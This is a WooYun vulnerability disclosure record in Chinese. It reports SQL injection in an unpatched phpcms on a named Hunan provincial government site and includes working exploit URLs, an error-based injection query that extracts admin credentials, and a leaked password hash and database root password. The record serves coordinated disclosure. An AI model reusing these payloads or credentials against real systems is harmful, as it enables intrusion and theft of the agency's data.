{"id": 25758, "wybug_id": "wooyun-2015-0130563", "wybug_title": "湖南省某管理局sql注入漏洞 root权限可能导致更大的安全隐患和信息泄露", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "网监大队", "wybug_date": "2015-08-02 22:20", "wybug_open_date": "2015-09-19 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向公众公开  简要描述： 湖南省某管理局sql注入漏洞 root权限可能导致更大的安全隐患和信息泄露 详细说明：  湖南省中医药管理局 http://www.hntcm.gov.cn 采用了老版本的phpcms,并且未打补丁。账号 密码#admin:84a2e9437eba98f8cad909d583e7d7cc#1root权限 危害比较大。可能导致更大的安全隐患和信息泄露#root@localhost:zyyglj#   漏洞证明：  \nhttp://www.hntcm.gov.cn/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin\n1z0e5Fc5LYf0Fga2GHZMr7gV9cYvgmLR\nhttp://www.hntcm.gov.cn/api.php?op=phpsso&code=a8afAwhSVVQDUQhVAg5VBlJSDVQCVgVTUVZeVVMHUBAKVlwOSxsLCFwGUQsUQ18GC0MUAlxRHBBRX11SEkYCRAVLXV4QEQAIVgJMRVFZQwxCTB5KHlZbDVdSTBlOFVYIBlpGExARAAhWAkxFGmVzLnMnYENWXEcXXV1bRUYFXAoAWEYbCBpXVx8USwBAWFcPU0gEGwFUGBNVQEtGCRRXSFNBAAARQiM2fCwYQm1XUg9fChQPW1hdFxQDFABPTxMCEVZfE1EMAwtBDFkRW1lYPUUHXAZfVBoXVVFUVBVGXw0OUEYTCE5UTR8HVApdRB4QVwpQSwIcHlEdGkARABRcCUNQXFVXEAgFRwhXC21FVQpTCVVNRlRWD1FAGFYUCUYUQ1tLE0BLBE0Q\n\nMySQL Query : SELECT * FROM `zyyglj`.`v9_member` WHERE `phpssouid` = '' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM '_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#' LIMIT 1 MySQL Error : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x' at line 1 MySQL Errno : 1064 Message : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x' at line 1 Need Help?\n   修复方案：  升级并更换key   版权声明：转载请注明来源 网监大队@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-05 10:29 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}